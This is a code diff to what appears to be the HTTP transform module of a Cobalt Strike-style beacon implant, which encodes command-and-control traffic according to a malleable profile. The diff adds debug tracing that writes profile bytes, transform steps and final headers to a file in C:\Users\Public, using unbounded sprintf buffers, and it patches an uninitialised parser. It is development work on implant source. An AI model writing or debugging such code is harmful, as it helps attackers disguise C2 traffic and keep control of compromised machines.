@@ -45,6 +45,11 @@ void TransformInit(TRANSFORM* transform, int size)
 	transform->parser = parser; /* VENDOR FIX: was never assigned - TransformDestroy freed NULL (segfault on first GET) */
 }
 
+static void TRTRACE(const char* what) {
+	FILE* f = fopen("C:\\\\Users\\\\Public\\\\ob_trace.txt", "a");
+	if (f) { fprintf(f, "[%lu] %s\\n", (unsigned long)GetTickCount(), what); fclose(f); }
+}
+
 void TransformEncode(TRANSFORM* transform,
 	unsigned char* request_profile,
 	const char* session,
@@ -59,6 +64,7 @@ void TransformEncode(TRANSFORM* transform,
 	int paramLength;
 	int transformedLength = 0;
 
+	{ char tb[300]; sprintf(tb, "TR: enter blob[0..11]=%02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x sessionLen=%d", (unsigned char)request_profile[0], (unsigned char)request_profile[1], (unsigned char)request_profile[2], (unsigned char)request_profile[3], (unsigned char)request_profile[4], (unsigned char)request_profile[5], (unsigned char)request_profile[6], (unsigned char)request_profile[7], (unsigned char)request_profile[8], (unsigned char)request_profile[9], (unsigned char)request_profile[10], (unsigned char)request_profile[11], session_len); TRTRACE(tb); }
 	BOOL isThereHostHeader = S_HOST_HEADER && strlen(S_HOST_HEADER) > 0;
 	BOOL isHostHeaderStepDone = FALSE;
 
@@ -68,6 +74,7 @@ void TransformEncode(TRANSFORM* transform,
 	unsigned long outlen;
 	for (int step = BeaconDataInt(&parser); step; step = BeaconDataInt(&parser))
 	{
+		{ char tb[128]; sprintf(tb, "TR: step=%d transformedLen=%d", step, transformedLength); TRTRACE(tb); }
 		switch(step)
 		{
 			case STEP__PARAMETER:
@@ -211,6 +218,7 @@ void TransformEncode(TRANSFORM* transform,
 		}
 	}
 
+	{ char tb[300]; sprintf(tb, "TR: exit headers=[%s]", transform->headers ? transform->headers : "(null)"); TRTRACE(tb); }
 	if(isThereHostHeader && !isHostHeaderStepDone)
 	{
 		snprintf(transform->temp, MAX_TEMP, "%s%s\r\n", transform->headers, S_HOST_HEADER);
